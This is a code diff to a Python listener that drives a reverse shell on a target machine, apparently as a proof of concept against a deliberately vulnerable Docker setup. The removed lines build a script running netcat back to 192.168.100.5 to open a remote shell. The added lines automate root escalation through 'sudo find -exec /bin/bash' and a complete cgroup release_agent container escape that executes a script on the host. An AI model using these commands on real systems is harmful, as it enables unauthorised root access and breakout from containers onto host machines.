@@ -39,27 +39,51 @@ def listen(ip, port):
 	try:
 		print('Connection received from ',addr)
 		# Commands in order to get root access
-		escalation = []
-		flag = True
-		while flag:
-			#Receive data from the target and get user input
-			print('[DEBBUG] Waitting for input')
-			print("")
-			ans = conn.recv(4194304).decode()
-			print('[DEBBUG] Input Received')
-			sys.stdout.write(ans)
-			command = input()
-
-			#Send command
-			command = 'cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/) | awk \'{ print $3 }\' && echo \'#!/bin/bash\' | cat >> tttrev && echo \'nc 192.168.100.5 6666 -e /bin/bash\' | cat >> tttrev && chmod a+x tttrev && sudo find . -exec ./tttrev \; -quit\n'
-			print('[DEBBUG] Sending command')
-			conn.send(command.encode())
-			print('[DEBBUG] Command sent')
-			time.sleep(0.35)
-
-			#Remove the output of the "input()" function
+		# In order to escalate privilege we will assume the docker has permission to run sudo find (simulating a, not so likely but possible, vulnerability)
+		escalation = ['cd /\n', 'sudo find . -exec /bin/bash \; -quit\n']
+		for cmd in escalation:
+			# Avoid stalling for ever
+			conn.settimeout(1.0)
+			try:
+				ans = conn.recv(4194304).decode()
+				sys.stdout.write(ans)
+			except socket.timeout:
+				# This will happen once we open the root shell because the input will be empty
+				pass
+			
+			conn.settimeout(None)
+			conn.send(cmd.encode())
+			time.sleep(0.30)
 			sys.stdout.write("\033[A" + ans.split("\n")[-1])
-			flag=False
+		# Whatever you put inside the $dir/escapingDocker script will be executed on the host
+		# with high privileges
+		escape= ['mkdir /tmp/cgroup_mount\n',
+			 'mount -t cgroup -o rmda cgroup /tmp/cgroup_mount/\n',
+			 'mkdir /tmp/cgroup_mount/test\n',
+			 'echo 1 > /tmp/cgroup_mount/test/notify_on_release\n',
+			 '''dir=$(sed -n 's/.*\perdir=\([^,]*\).*/\\1/p' /etc/mtab)\n''',
+			 'echo $dir"/escapingDocker" >  /tmp/cgroup_mount/release_agent\n',
+			 '''echo '#!/bin/bash' >> $dir/escapingDocker\n''',
+			 '''echo 'ps aux > $dir/output' >> $dir/escapingDocker\n''',
+			 '''echo 'echo "PoC, injected through the container" > /File_on_Host' >> $dir/escapingDocker\n''',
+			 'chmod a+x $dir/escapingDocker\n',
+			 'sh -c "echo\$$ > /tmp/cgroup_mount/test/cgroup.procs"\n']
+
+		for cmd in escape:
+			# Avoid stalling for ever
+			conn.settimeout(1.0)
+			try:
+				ans = conn.recv(4194304).decode()
+				sys.stdout.write(ans)
+			except socket.timeout:
+				# This will happen once we open the root shell because the input will be empty
+				pass
+			
+			conn.settimeout(None)
+			conn.send(cmd.encode())
+			time.sleep(0.30)
+			sys.stdout.write("\033[A" + ans.split("\n")[-1])
+	
 	except KeyboardInterrupt:
 		if conn:
 			print('\n[-] Unbinding...')
